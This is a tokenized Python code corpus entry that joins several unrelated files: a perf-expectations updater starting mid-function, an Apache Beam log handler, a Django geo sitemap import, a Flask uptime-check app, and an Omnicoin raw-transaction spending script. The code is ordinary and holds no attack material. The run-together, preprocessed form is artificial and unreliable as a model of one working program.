Create ▁ the ▁ summary_url ▁ and ▁ get ▁ the ▁ json ▁ data ▁ for ▁ that ▁ URL. <encdom>  # ▁ FetchUrlContents() ▁ may ▁ sleep ▁ to ▁ avoid ▁ overloading ▁ the ▁ server ▁ with <encdom>  # ▁ requests. <encdom> summary_url = '%s/%s/%s/%s-summary.dat' % ( base_url , system , test , graph ) <newline> summaryjson = FetchUrlContents ( summary_url ) <newline> if not summaryjson : <newline> <indent> OutputMessage ( 'ERROR: ▁ cannot ▁ find ▁ json ▁ data, ▁ please ▁ verify' , verbose_message = False ) <newline> return 0 <newline>  # ▁ Set ▁ value's ▁ type ▁ to ▁'relative' ▁ by ▁ default. <encdom> <dedent> value_type = value . get ( 'type' , 'relative' ) <newline> summarylist = summaryjson . split ( ' \n ' ) <newline> trace_values = { } <newline> traces = [ tracename ] <newline> if value_type == 'relative' : <newline> <indent> traces += [ reftracename ] <newline> <dedent> for trace in traces : <newline> <indent> trace_values . setdefault ( trace , { } ) <newline>  # ▁ Find ▁ the ▁ high ▁ and ▁ low ▁ values ▁ for ▁ each ▁ of ▁ the ▁ traces. <encdom> <dedent> scanning = False <newline> for line in summarylist : <newline> <indent> jsondata = ConvertJsonIntoDict ( line ) <newline> if int ( jsondata [ 'rev' ] ) <= revb : <newline> <indent> scanning = True <newline> <dedent> if int ( jsondata [ 'rev' ] ) < reva : <newline> <indent> break <newline>  # ▁ We ▁ found ▁ the ▁ upper ▁ revision ▁ in ▁ the ▁ range. ▁ Scan ▁ for ▁ trace ▁ data ▁ until ▁ we <encdom>  # ▁ find ▁ the ▁ lower ▁ revision ▁ in ▁ the ▁ range. <encdom> <dedent> if scanning : <newline> <indent> for trace in traces : <newline> <indent> if trace not in jsondata [ 'traces' ] : <newline> <indent> OutputMessage ( 'trace ▁ %s ▁ missing' % trace ) <newline> continue <newline> <dedent> if type ( jsondata [ 'traces' ] [ trace ] ) != type ( [ ] ) : <newline> <indent> OutputMessage ( 'trace ▁ %s ▁ format ▁ not ▁ recognized' % trace ) <newline> continue <newline> <dedent> try : <newline> <indent> tracevalue = float ( jsondata [ 'traces' ] [ trace ] [ 0 ] ) <newline> <dedent> except ValueError : <newline> <indent> OutputMessage ( 'trace ▁ %s ▁ value ▁ error: ▁ %s' % ( trace , str ( jsondata [ 'traces' ] [ trace ] [ 0 ] ) ) ) <newline> continue <newline> <dedent> for bound in [ 'high' , 'low' ] : <newline> <indent> trace_values [ trace ] . setdefault ( bound , tracevalue ) <newline> <dedent> trace_values [ trace ] [ 'high' ] = max ( trace_values [ trace ] [ 'high' ] , tracevalue ) <newline> trace_values [ trace ] [ 'low' ] = min ( trace_values [ trace ] [ 'low' ] , tracevalue ) <newline> <dedent> <dedent> <dedent> if 'high' not in trace_values [ tracename ] : <newline> <indent> OutputMessage ( 'no ▁ suitable ▁ traces ▁ matched, ▁ skipping' ) <newline> continue <newline> <dedent> if value_type == 'relative' : <newline>  # ▁ Calculate ▁ assuming ▁ high ▁ deltas ▁ are ▁ regressions ▁ and ▁ low ▁ deltas ▁ are <encdom>  # ▁ improvements. <encdom> <indent> regress = ( float ( trace_values [ tracename ] [ 'high' ] ) - float ( trace_values [ reftracename ] [ 'low' ] ) ) <newline> improve = ( float ( trace_values [ tracename ] [ 'low' ] ) - float ( trace_values [ reftracename ] [ 'high' ] ) ) <newline> <dedent> elif value_type == 'absolute' : <newline>  # ▁ Calculate ▁ assuming ▁ high ▁ absolutes ▁ are ▁ regressions ▁ and ▁ low ▁ absolutes ▁ are <encdom>  # ▁ improvements. <encdom> <indent> regress = float ( trace_values [ tracename ] [ 'high' ] ) <newline> improve = float ( trace_values [ tracename ] [ 'low' ] ) <newline>  # ▁ So ▁ far ▁ we've ▁ assumed ▁ better ▁ is ▁ lower ▁ (regress ▁ > ▁ improve). ▁ If ▁ the ▁ actual <encdom>  # ▁ values ▁ for ▁ regress ▁ and ▁ improve ▁ are ▁ equal, ▁ though, ▁ and ▁ better ▁ was ▁ not <encdom>  # ▁ specified, ▁ alert ▁ the ▁ user ▁ so ▁ we ▁ don't ▁ let ▁ them ▁ create ▁ a ▁ new ▁ file ▁ with <encdom>  # ▁ ambiguous ▁ rules. <encdom> <dedent> if better == None and regress == improve : <newline> <indent> OutputMessage ( 'regress ▁ (%s) ▁ is ▁ equal ▁ to ▁ improve ▁ (%s), ▁ and ▁"better" ▁ is ▁ ' 'unspecified, ▁ please ▁ fix ▁ by ▁ setting ▁"better": ▁"lower" ▁ or ▁ ' '"better": ▁"higher" ▁ in ▁ this ▁ perf ▁ trace\'s ▁ expectation' % ( regress , improve ) , verbose_message = False ) <newline> return 1 <newline>  # ▁ If ▁ the ▁ existing ▁ values ▁ assume ▁ regressions ▁ are ▁ low ▁ deltas ▁ relative ▁ to <encdom>  # ▁ improvements, ▁ swap ▁ our ▁ regress ▁ and ▁ improve. ▁ This ▁ value ▁ must ▁ be ▁ a <encdom>  # ▁ scores-like ▁ result. <encdom> <dedent> if 'regress' in perf [ key ] and 'improve' in perf [ key ] : <newline> <indent> if perf [ key ] [ 'regress' ] < perf [ key ] [ 'improve' ] : <newline> <indent> assert ( better != 'lower' ) <newline> better = 'higher' <newline> temp = regress <newline> regress = improve <newline> improve = temp <newline> <dedent> else : <newline>  # ▁ Sometimes ▁ values ▁ are ▁ equal, ▁ e.g., ▁ when ▁ they ▁ are ▁ both ▁ 0, <encdom>  # ▁'better' ▁ may ▁ still ▁ be ▁ set ▁ to ▁'higher'. <encdom> <indent> assert ( better != 'higher' or perf [ key ] [ 'regress' ] == perf [ key ] [ 'improve' ] ) <newline> better = 'lower' <newline>  # ▁ If ▁ both ▁ were ▁ ints ▁ keep ▁ as ▁ int, ▁ otherwise ▁ use ▁ the ▁ float ▁ version. <encdom> <dedent> <dedent> originally_ints = False <newline> if FloatIsInt ( regress ) and FloatIsInt ( improve ) : <newline> <indent> originally_ints = True <newline> <dedent> if better == 'higher' : <newline> <indent> if originally_ints : <newline> <indent> regress = int ( math . floor ( regress - abs ( regress * tolerance ) ) ) <newline> improve = int ( math . ceil ( improve + abs ( improve * tolerance ) ) ) <newline> <dedent> else : <newline> <indent> regress = regress - abs ( regress * tolerance ) <newline> improve = improve + abs ( improve * tolerance ) <newline> <dedent> <dedent> else : <newline> <indent> if originally_ints : <newline> <indent> improve = int ( math . floor ( improve - abs ( improve * tolerance ) ) ) <newline> regress = int ( math . ceil ( regress + abs ( regress * tolerance ) ) ) <newline> <dedent> else : <newline> <indent> improve = improve - abs ( improve * tolerance ) <newline> regress = regress + abs ( regress * tolerance ) <newline>  # ▁ Calculate ▁ the ▁ new ▁ checksum ▁ to ▁ test ▁ if ▁ this ▁ is ▁ the ▁ only ▁ thing ▁ that ▁ may ▁ have <encdom>  # ▁ changed. <encdom> <dedent> <dedent> checksum_rowdata = GetRowData ( perf , key ) <newline> new_checksum = GetRowDigest ( checksum_rowdata , key ) <newline> if ( 'regress' in perf [ key ] and 'improve' in perf [ key ] and perf [ key ] [ 'regress' ] == regress and perf [ key ] [ 'improve' ] == improve and original_checksum == new_checksum ) : <newline> <indent> OutputMessage ( 'no ▁ change' ) <newline> continue <newline> <dedent> write_new_expectations = True <newline> OutputMessage ( 'traces: ▁ %s' % trace_values , verbose_message = False ) <newline> OutputMessage ( 'before: ▁ %s' % perf [ key ] , verbose_message = False ) <newline> perf [ key ] [ 'regress' ] = regress <newline> perf [ key ] [ 'improve' ] = improve <newline> OutputMessage ( 'after: ▁ %s' % perf [ key ] , verbose_message = False ) <newline> <dedent> if options . checksum : <newline> <indent> if found_checksum_mismatch : <newline> <indent> return 1 <newline> <dedent> else : <newline> <indent> return 0 <newline> <dedent> <dedent> if write_new_expectations : <newline> <indent> print ' \n Writing ▁ expectations... ▁ ' , <newline> WriteJson ( perf_file , perf , perfkeys ) <newline> print 'done' <newline> <dedent> else : <newline> <indent> if options . verbose : <newline> <indent> print '' <newline> <dedent> print 'No ▁ changes.' <newline> <dedent> return 0 <newline> <dedent> if __name__ == '__main__' : <newline> <indent> sys . exit ( Main ( sys . argv ) ) <newline> <dedent>
 # ▁ Licensed ▁ to ▁ the ▁ Apache ▁ Software ▁ Foundation ▁ (ASF) ▁ under ▁ one ▁ or ▁ more <encdom>  # ▁ contributor ▁ license ▁ agreements. ▁ See ▁ the ▁ NOTICE ▁ file ▁ distributed ▁ with <encdom>  # ▁ this ▁ work ▁ for ▁ additional ▁ information ▁ regarding ▁ copyright ▁ ownership. <encdom>  # ▁ The ▁ ASF ▁ licenses ▁ this ▁ file ▁ to ▁ You ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 <encdom>  # ▁ (the ▁"License"); ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with <encdom>  # ▁ the ▁ License. ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom>  """ Beam ▁ fn ▁ API ▁ log ▁ handler. """  <newline> import logging <newline> import math <newline> import Queue as queue <newline> import threading <newline> import grpc <newline> from apache_beam . portability . api import beam_fn_api_pb2 <newline> from apache_beam . portability . api import beam_fn_api_pb2_grpc <newline>  # ▁ This ▁ module ▁ is ▁ experimental. ▁ No ▁ backwards-compatibility ▁ guarantees. <encdom> class FnApiLogRecordHandler ( logging . Handler ) : <newline> <indent>  """ A ▁ handler ▁ that ▁ writes ▁ log ▁ records ▁ to ▁ the ▁ fn ▁ API. """  <newline>  # ▁ Maximum ▁ number ▁ of ▁ log ▁ entries ▁ in ▁ a ▁ single ▁ stream ▁ request. <encdom> _MAX_BATCH_SIZE = 1000 <newline>  # ▁ Used ▁ to ▁ indicate ▁ the ▁ end ▁ of ▁ stream. <encdom> _FINISHED = object ( ) <newline>  # ▁ Mapping ▁ from ▁ logging ▁ levels ▁ to ▁ LogEntry ▁ levels. <encdom> LOG_LEVEL_MAP = { logging . FATAL : beam_fn_api_pb2 . LogEntry . Severity . CRITICAL , logging . ERROR : beam_fn_api_pb2 . LogEntry . Severity . ERROR , logging . WARNING : beam_fn_api_pb2 . LogEntry . Severity . WARN , logging . INFO : beam_fn_api_pb2 . LogEntry . Severity . INFO , logging . DEBUG : beam_fn_api_pb2 . LogEntry . Severity . DEBUG } <newline> def __init__ ( self , log_service_descriptor ) : <newline> <indent> super ( FnApiLogRecordHandler , self ) . __init__ ( ) <newline> self . _log_channel = grpc . insecure_channel ( log_service_descriptor . url ) <newline> self . _logging_stub = beam_fn_api_pb2_grpc . BeamFnLoggingStub ( self . _log_channel ) <newline> self . _log_entry_queue = queue . Queue ( ) <newline> log_control_messages = self . _logging_stub . Logging ( self . _write_log_entries ( ) ) <newline> self . _reader = threading . Thread ( target = lambda : self . _read_log_control_messages ( log_control_messages ) , name = 'read_log_control_messages' ) <newline> self . _reader . daemon = True <newline> self . _reader . start ( ) <newline> <dedent> def emit ( self , record ) : <newline> <indent> log_entry = beam_fn_api_pb2 . LogEntry ( ) <newline> log_entry . severity = self . LOG_LEVEL_MAP [ record . levelno ] <newline> log_entry . message = self . format ( record ) <newline> log_entry . thread = record . threadName <newline> log_entry . log_location = record . module + '.' + record . funcName <newline> ( fraction , seconds ) = math . modf ( record . created ) <newline> nanoseconds = 1e9 * fraction <newline> log_entry . timestamp . seconds = int ( seconds ) <newline> log_entry . timestamp . nanos = int ( nanoseconds ) <newline> self . _log_entry_queue . put ( log_entry ) <newline> <dedent> def close ( self ) : <newline> <indent>  """ Flush ▁ out ▁ all ▁ existing ▁ log ▁ entries ▁ and ▁ unregister ▁ this ▁ handler. """  <newline>  # ▁ Acquiring ▁ the ▁ handler ▁ lock ▁ ensures ▁ ``emit`` ▁ is ▁ not ▁ run ▁ until ▁ the ▁ lock ▁ is <encdom>  # ▁ released. <encdom> self . acquire ( ) <newline> self . _log_entry_queue . put ( self . _FINISHED ) <newline>  # ▁ wait ▁ on ▁ server ▁ to ▁ close. <encdom> self . _reader . join ( ) <newline> self . release ( ) <newline>  # ▁ Unregister ▁ this ▁ handler. <encdom> super ( FnApiLogRecordHandler , self ) . close ( ) <newline> <dedent> def _write_log_entries ( self ) : <newline> <indent> done = False <newline> while not done : <newline> <indent> log_entries = [ self . _log_entry_queue . get ( ) ] <newline> try : <newline> <indent> for _ in range ( self . _MAX_BATCH_SIZE ) : <newline> <indent> log_entries . append ( self . _log_entry_queue . get_nowait ( ) ) <newline> <dedent> <dedent> except queue . Empty : <newline> <indent> pass <newline> <dedent> if log_entries [ - 1 ] is self . _FINISHED : <newline> <indent> done = True <newline> log_entries . pop ( ) <newline> <dedent> if log_entries : <newline> <indent> yield beam_fn_api_pb2 . LogEntry . List ( log_entries = log_entries ) <newline> <dedent> <dedent> <dedent> def _read_log_control_messages ( self , log_control_iterator ) : <newline>  # ▁ TODO(vikasrk): ▁ Handle ▁ control ▁ messages. <encdom> <indent> for _ in log_control_iterator : <newline> <indent> pass <newline> <dedent> <dedent> <dedent>
 # ▁ Geo-enabled ▁ Sitemap ▁ classes. <encdom> from django . contrib . gis . sitemaps . georss import GeoRSSSitemap <newline> from django . contrib . gis . sitemaps . kml import KMLSitemap , KMZSitemap <newline>
import json <newline> import logging <newline> from flask import Flask , request , render_template <newline> from flask_restful import Api , abort <newline> from redis import StrictRedis <newline> from uptime . resources import Hello , Checks <newline> logging . getLogger ( 'uptime' ) <newline> class FlaskApp : <newline> <indent> def __init__ ( self , config ) : <newline> <indent> self . config = config <newline> self . redis = StrictRedis ( host = self . config . redis_host , port = self . config . redis_port ) <newline> self . app = Flask ( 'uptime' , static_folder = self . config . app_dir + '/static' , template_folder = self . config . app_dir + '/templates' ) <newline> self . api = Api ( self . app ) <newline> self . app . config . from_object ( self . config ) <newline> self . app . config [ 'UPTIME' ] = self . config <newline> self . api . add_resource ( Hello , '/' ) <newline> self . api . add_resource ( Checks , '/checks' ) <newline> print ( 'Starting ▁ uptime ▁ with ▁ auth_key: ▁ %s' % self . config . auth_key ) <newline> <dedent> @ staticmethod <newline> def sorter ( d ) : <newline> <indent> return d [ 'url' ] <newline> <dedent> def initialize ( self ) : <newline> <indent> @ self . app . route ( '/checkview' , methods = [ 'GET' ] ) <newline> def buildview ( ) : <newline> <indent> if request . args [ 'key' ] != self . config . auth_key : <newline> <indent> abort ( 403 ) <newline> <dedent> checks = [ json . loads ( self . redis . get ( k ) . decode ( self . config . encoding ) ) for k in self . redis . keys ( pattern = 'uptime_results:*' ) ] <newline> total_checks = self . redis . get ( 'uptime_stats:total_checks' ) <newline> return render_template ( 'index.html' , total_checks = total_checks , checks = sorted ( checks , key = self . sorter ) ) <newline> <dedent> @ self . app . route ( '/static/<path:path>' ) <newline> def send_static ( path ) : <newline> <indent> return self . app . send_static_file ( path . split ( '/' ) [ - 1 ] ) <newline> <dedent> @ self . app . errorhandler ( 403 ) <newline> def forbidden_403 ( exception ) : <newline> <indent> return 'unauthorized' , 403 <newline> <dedent> <dedent> <dedent>
 # !/usr/bin/env ▁ python <encdom>  # ▁ Use ▁ the ▁ raw ▁ transactions ▁ API ▁ to ▁ spend ▁ bitcoins ▁ received ▁ on ▁ particular ▁ addresses, <encdom>  # ▁ and ▁ send ▁ any ▁ change ▁ back ▁ to ▁ that ▁ same ▁ address. <encdom>  # ▁ Example ▁ usage: <encdom>  # ▁ spendfrom.py ▁ # ▁ Lists ▁ available ▁ funds <encdom>  # ▁ spendfrom.py ▁ --from=ADDRESS ▁ --to=ADDRESS ▁ --amount=11.00 <encdom>  # ▁ Assumes ▁ it ▁ will ▁ talk ▁ to ▁ a ▁ bitcoind ▁ or ▁ Omnicoin-Qt ▁ running <encdom>  # ▁ on ▁ localhost. <encdom>  # ▁ Depends ▁ on ▁ jsonrpc <encdom> from decimal import * <newline> import getpass <newline> import math <newline> import os <newline> import os . path <newline> import platform <newline> import sys <newline> import time <newline> from jsonrpc import ServiceProxy , json <newline> BASE_FEE = Decimal ( "0.001" ) <newline> def check_json_precision ( ) : <newline> <indent>  """ Make ▁ sure ▁ json ▁ library ▁ being ▁ used ▁ does ▁ not ▁ lose ▁ precision ▁ converting ▁ OMC ▁ values """  <newline> n = Decimal ( "20000000.00000003" ) <newline> satoshis = int ( json . loads ( json . dumps ( float ( n ) ) ) * 1.0e8 ) <newline> if satoshis != 2000000000000003 : <newline> <indent> raise RuntimeError ( "JSON ▁ encode/decode ▁ loses ▁ precision" ) <newline> <dedent> <dedent> def determine_db_dir ( ) : <newline> <indent>  """ Return ▁ the ▁ default ▁ location ▁ of ▁ the ▁ bitcoin ▁ data ▁ directory """  <newline> if platform . system ( ) == "Darwin" : <newline> <indent> return os . path . expanduser ( "~/Library/Application ▁ Support/Omnicoin/" ) <newline> <dedent> elif platform . system ( ) == "Windows" : <newline> <indent> return os . path . join ( os . environ [ 'APPDATA' ] , "Omnicoin" ) <newline> <dedent> return os . path . expanduser ( "~/.bitcoin" ) <newline> <dedent> def read_bitcoin_config ( dbdir ) : <newline> <indent>  """ Read ▁ the ▁ bitcoin.conf ▁ file ▁ from ▁ dbdir, ▁ returns ▁ dictionary ▁ of ▁ settings """  <newline> from ConfigParser import SafeConfigParser <newline> class FakeSecHead ( object ) : <newline> <indent> def __init__ ( self , fp ) : <newline> <indent> self . fp = fp <newline> self . sechead = '[all] \n ' <newline> <dedent> def readline ( self ) : <newline> <indent> if self . sechead : <newline> <indent> try : return self . sechead <newline> finally : self . sechead = None <newline> <dedent> else : <newline> <indent> s = self . fp . readline ( ) <newline> if s . find ( ' # ' ) != - 1 : <newline> <indent> s = s [ 0 : s . find ( ' # ' ) ] . strip ( ) + " \n " <newline> <dedent> return s <newline> <dedent> <dedent> <dedent> config_parser = SafeConfigParser ( ) <newline> config_parser . readfp ( FakeSecHead ( open ( os . path . join ( dbdir , "bitcoin.conf" ) ) ) ) <newline> return dict ( config_parser . items ( "all" ) ) <newline> <dedent> def connect_JSON ( config ) : <newline> <indent>  """ Connect ▁ to ▁ a ▁ bitcoin ▁ JSON-RPC ▁ server """  <newline> testnet = config . get ( 'testnet' , '0' ) <newline> testnet = ( int ( testnet ) > 0 )  # ▁ 0/1 ▁ in ▁ config ▁ file, ▁ convert ▁ to ▁ True/False <encdom> <newline> if not 'rpcport' in config : <newline> <indent> config [ 'rpcport' ] = 19332 if testnet else 9332 <newline> <dedent> connect = "http://%s:%s@127.0.0.1:%s" % ( config [ 'rpcuser' ] , config [ 'rpcpassword' ] , config [ 'rpcport' ] ) <newline> try : <newline> <indent> result = ServiceProxy ( connect ) <newline>  # ▁ ServiceProxy ▁ is ▁ lazy-connect, ▁ so ▁ send ▁ an ▁ RPC ▁ command ▁ mostly ▁ to ▁ catch ▁ connection ▁ errors, <encdom>  # ▁ but ▁ also ▁ make ▁ sure ▁ the ▁ bitcoind ▁ we're ▁ talking ▁ to ▁ is/isn't ▁ testnet: <encdom> if result . getmininginfo ( ) [ 'testnet' ] != testnet : <newline> <indent> sys . stderr . write ( "RPC ▁ server ▁ at ▁ " + connect + " ▁ testnet ▁ setting ▁ mismatch \n " ) <newline> sys . exit ( 1 ) <newline> <dedent> return result <newline> <dedent> except : <newline> <indent> sys . stderr . write ( "Error ▁ connecting ▁ to ▁ RPC ▁ server ▁ at ▁ " + connect + " \n " ) <newline> sys . exit ( 1 ) <newline> <dedent> <dedent> def unlock_wallet ( bitcoind ) : <newline> <indent> info = bitcoind . getinfo ( ) <newline> if 'unlocked_until' not in info : <newline> <indent> return True  # ▁ wallet ▁ is ▁ not ▁ encrypted <encdom> <newline> <dedent> t = int ( info [ 'unlocked_until' ] ) <newline> if t <= time . time ( ) : <newline> <indent> try : <newline> <indent> passphrase = getpass . getpass ( "Wallet ▁ is ▁ locked; ▁ enter ▁ passphrase: ▁ " ) <newline> bitcoind . walletpassphrase ( passphrase , 5 ) <newline> <dedent> except : <newline> <indent> sys . stderr . write ( "Wrong ▁ passphrase \n " ) <newline> <dedent> <dedent> info = bitcoind . getinfo ( ) <newline> return int ( info [ 'unlocked_until' ] ) > time . time ( ) <newline> <dedent> def list_available ( bitcoind ) : <newline> <indent> address_summary = dict ( ) <newline> address_to_account = dict ( ) <newline> for info in bitcoind . listreceivedbyaddress ( 0 ) : <newline> <indent> address_to_account [ info [ "address" ] ] = info [ "account" ] <newline> <dedent> unspent = bitcoind . listunspent ( 0 ) <newline> for output in unspent : <newline>  # ▁ listunspent ▁ doesn't ▁ give ▁ addresses, ▁ so: <encdom> <indent> rawtx = bitcoind . getrawtransaction ( output [ 'txid' ] , 1 ) <newline> vout = rawtx [ "vout" ] [ output [ 'vout' ] ] <newline> pk = vout [ "scriptPubKey" ] <newline>  # ▁ This ▁ code ▁ only ▁ deals ▁ with ▁ ordinary ▁ pay-to-bitcoin-address <encdom>  # ▁ or ▁ pay-to-script-hash ▁ outputs ▁ right ▁ now; ▁ anything ▁ exotic ▁ is ▁ ignored. <encdom> if pk [ "type" ] != "pubkeyhash" and pk [ "type" ] != "scripthash" : <newline> <indent> continue <newline> <dedent> address = pk [ "addresses" ] [ 0 ] <newline> if address in address_summary : <newline> <indent> address_summary [ address ] [ "total" ] += vout [ "value" ] <newline> address_summary [ address ] [ "outputs" ] . append ( output ) <newline> <dedent> else : <newline> <indent> address_summary [ address ] = { "total" : vout [ "value" ] , "outputs" : [ output ] , "account" : address_to_account . get ( address , "" ) } <newline> <dedent> <dedent> return address_summary <newline> <dedent> def select_coins ( needed , inputs ) : <newline>  # ▁ Feel ▁ free ▁ to ▁ improve ▁ this, ▁ this ▁ is ▁ good ▁ enough ▁ for ▁ my ▁ simple ▁ needs: <encdom> <indent> outputs = [ ] <newline> have = Decimal ( "0.0" ) <newline> n = 0 <newline> while have < needed and n < len ( inputs ) : <newline> <indent> outputs . append ( { "txid" : inputs [ n ] [ "txid" ] , "vout" : inputs [ n ] [ "vout" ] } ) <newline> have += inputs [ n ] [ "amount" ] <newline> n += 1 <newline> <dedent> return ( outputs , have - needed ) <newline> <dedent> def create_tx ( bitcoind , fromaddresses , toaddress , amount , fee ) : <newline> <indent> all_coins = list_available ( bitcoind ) <newline> total_available = Decimal ( "0.0" ) <newline> needed = amount + fee <newline> potential_inputs = [ ] <newline> for addr in fromaddresses : <newline> <indent> if addr not in all_coins : <newline> <indent> continue <newline> <dedent> potential_inputs . extend ( all_coins [ addr ] [ "outputs" ] ) <newline> total_available += all_coins [ addr ] [ "total" ] <newline> <dedent> if total_available < needed : <newline> <indent> sys . stderr . write ( "Error, ▁ only ▁ %f ▁ OMC ▁ available, ▁ need ▁ %f \n " % ( total_available , needed ) ) ; <newline> sys . exit ( 1 ) <newline>  # ▁ Note: <encdom>  # ▁ Python's ▁ json/jsonrpc ▁ modules ▁ have ▁ inconsistent ▁ support ▁ for ▁ Decimal ▁ numbers. <encdom>  # ▁ Instead ▁ of ▁ wrestling ▁ with ▁ getting ▁ json.dumps() ▁ (used ▁ by ▁ jsonrpc) ▁ to ▁ encode <encdom>  # ▁ Decimals, ▁ I'm ▁ casting ▁ amounts ▁ to ▁ float ▁ before ▁ sending ▁ them ▁ to ▁ bitcoind. <encdom> <dedent> outputs = { toaddress : float ( amount ) } <newline> ( inputs , change_amount ) = select_coins ( needed , potential_inputs ) <newline> if change_amount > BASE_FEE :  # ▁ don't ▁ bother ▁ with ▁ zero ▁ or ▁ tiny ▁ change <encdom> <newline> <indent> change_address = fromaddresses [ - 1 ] <newline> if change_address in outputs : <newline> <indent> outputs [ change_address ] += float ( change_amount ) <newline> <dedent> else : <newline> <indent> outputs [ change_address ] = float ( change_amount ) <newline> <dedent> <dedent> rawtx = bitcoind . createrawtransaction ( inputs , outputs ) <newline> signed_rawtx = bitcoind . signrawtransaction ( rawtx ) <newline> if not signed_rawtx [ "complete" ] : <newline> <indent> sys . stderr . write ( "signrawtransaction ▁ failed \n " ) <newline> sys . exit ( 1 ) <newline> <dedent> txdata = signed_rawtx [ "hex" ] <newline> return txdata <newline> <dedent> def compute_amount_in ( bitcoind , txinfo ) : <newline> <indent> result = Decimal ( "0.0" ) <newline> for vin in txinfo [ 'vin' ] : <newline> <indent> in_info = bitcoind . getrawtransaction ( vin [ 'txid' ] , 1 ) <newline> vout = in_info [ 'vout' ] [ vin [ 'vout' ] ] <newline> result = result + vout [ 'value' ] <newline> <dedent> return result <newline> <dedent> def compute_amount_out ( txinfo ) : <newline> <indent> result = Decimal ( "0.0" ) <newline> for vout in txinfo [ 'vout' ] : <newline> <indent> result = result + vout [ 'value' ] <newline> <dedent> return result <newline> <dedent> def sanity_test_fee ( bitcoind , txdata_hex , max_fee ) : <newline> <indent> class FeeError ( RuntimeError ) : <newline> <indent> pass <newline> <dedent> try : <newline> <indent> txinfo = bitcoind . decoderawtransaction ( txdata_hex ) <newline> total_in = compute_amount_in ( bitcoind , txinfo ) <newline> total_out = compute_amount_out ( txinfo ) <newline> if total_in - total_out > max_fee : <newline> <indent> raise FeeError ( "Rejecting ▁ transaction, ▁ unreasonable ▁ fee ▁ of ▁ " + str ( total_in - total_out ) ) <newline> <dedent> tx_size = len ( txdata_hex ) / 2 <newline> kb = tx_size / 1000  # ▁ integer ▁ division ▁ rounds ▁ down <encdom> <newline> if kb > 1 and fee < BASE_FEE : <newline> <indent> raise FeeError ( "Rejecting ▁ no-fee ▁ transaction, ▁ larger ▁ than ▁ 1000 ▁ bytes" ) <newline> <dedent> if total_in < 0.01 and fee < BASE_FEE : <newline> <indent> raise FeeError ( "Rejecting ▁ no-fee, ▁ tiny-amount ▁ transaction" ) <newline>  # ▁ Exercise ▁ for ▁ the ▁ reader: ▁ compute ▁ transaction ▁ priority, ▁ and <encdom>  # ▁ warn ▁ if ▁ this ▁ is ▁ a ▁ very-low-priority ▁ transaction <encdom> <dedent> <dedent> except FeeError as err : <newline> <indent> sys . stderr . write ( ( str ( err ) + " \n " ) ) <newline> sys . exit ( 1 ) <newline> <dedent> <dedent> def main ( ) : <newline> <indent> import optparse <newline> parser = optparse . OptionParser ( usage = "%prog ▁ [options]" ) <newline> parser . add_option ( "--from" , dest = "fromaddresses" , default = None , help = "addresses ▁ to ▁ get ▁ bitcoins ▁ from" ) <newline> parser . add_option ( "--to" , dest = "to" , default = None , help = "address ▁ to ▁ get ▁ send ▁ bitcoins ▁ to" ) <newline> parser . add_option ( "--amount" , dest = "amount" , default = None , help = "amount ▁ to ▁ send" ) <newline> parser . add_option ( "--fee" , dest = "fee" , default = "0.0" , help = "fee ▁ to ▁ include" ) <newline> parser . add_option ( "--datadir" , dest = "datadir" , default = determine_db_dir ( ) , help = "location ▁ of ▁ bitcoin.conf ▁ file ▁ with ▁ RPC ▁ username/password ▁ (default: ▁ %default)" ) <newline> parser . add_option ( "--testnet" , dest = "testnet" , default = False , action = "store_true" , help = "Use ▁ the ▁ test ▁ network" ) <newline> parser . add_option ( "--dry_run" , dest = "dry_run" , default = False , action = "store_true" , help = "Don't ▁ broadcast ▁ the ▁ transaction, ▁ just ▁ create ▁ and ▁ print ▁ the ▁ transaction ▁ data" ) <newline> ( options , args ) = parser . parse_args ( ) <newline> check_json_precision ( ) <newline> config = read_bitcoin_config ( options . datadir ) <newline> if options . testnet : config [ 'testnet' ] = True <newline> bitcoind = connect_JSON ( config ) <newline> if options . amount is None : <newline> <indent> address_summary = list_available ( bitcoind ) <newline> for address , info in address_summary . iteritems ( ) : <newline> <indent> n_transactions = len ( info [ 'outputs' ] ) <newline> if n_transactions > 1 : <newline> <indent> print ( "%s ▁ %.8f ▁ %s ▁ (%d ▁ transactions)" % ( address , info [ 'total' ] , info [ 'account' ] , n_transactions ) ) <newline> <dedent> else : <newline> <indent> print ( "%s ▁ %.8f ▁ %s" % ( address , info [ 'total' ] , info [ 'account' ] ) ) <newline> <dedent> <dedent> <dedent> else : <newline> <indent> fee = Decimal ( options . fee ) <newline> amount = Decimal ( options . amount ) <newline> while unlock_wallet ( bitcoind ) == False : <newline> <indent> pass  # ▁ Keep ▁ asking ▁ for ▁ passphrase ▁ until ▁ they ▁ get ▁ it ▁ right <encdom> <newline> <dedent> txdata = create_tx ( bitcoind , options . fromaddresses . split ( "," ) , options . to , amount , fee ) <newline> sanity_test_fee ( bitcoind , txdata , amount * Decimal ( "0.01" ) ) <newline> if options . dry_run : <newline> <indent> print ( txdata ) <newline> <dedent> else : <newline> <indent> txid = bitcoind . sendrawtransaction ( txdata ) <newline> print ( txid ) <newline> <dedent> <dedent> <dedent> if __name__ == '__main__' : <newline> <indent> main ( ) <newline> <dedent>
